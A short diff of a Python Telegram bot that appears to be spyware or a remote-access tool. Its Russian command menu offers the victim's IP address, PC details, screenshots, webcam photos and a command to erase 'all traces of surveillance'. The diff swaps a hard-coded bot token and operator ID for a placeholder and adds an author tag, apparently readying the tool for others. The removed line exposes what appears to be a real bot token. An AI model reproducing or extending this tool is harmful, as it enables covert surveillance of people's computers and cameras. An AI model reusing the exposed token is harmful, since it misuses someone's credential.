@@ -7,8 +7,7 @@ import platform as pf
 import os
  
 
-token = '5145274029:AAFEqrP8ArsPyAVXHDBi2aJzEruD-A0BXf0'
-me = 1480501620
+token = 'ТУТ ТОКЕН БОТА'
 bot = telebot.TeleBot(token)
 
 @bot.message_handler(commands=["start"])
@@ -23,7 +22,7 @@ def start(message):
 
 @bot.message_handler(commands=["info"])
 def info(message):
-	bot.send_message(message.chat.id,'/ip - Узнать IP-адрес\n\n/pc - Хар-ка ПК\n\n/screenshot - скрин экрана\n\n/webcam - фото с камеры\n\n/delete - удалить все следы слежки')
+	bot.send_message(message.chat.id,'/ip - Узнать IP-адрес\n\n/pc - Хар-ка ПК\n\n/screenshot - скрин экрана\n\n/webcam - фото с камеры\n\n/delete - удалить все следы слежки\n\nBY @sblro4eeek')
 
 
 @bot.message_handler(commands=["ip"])
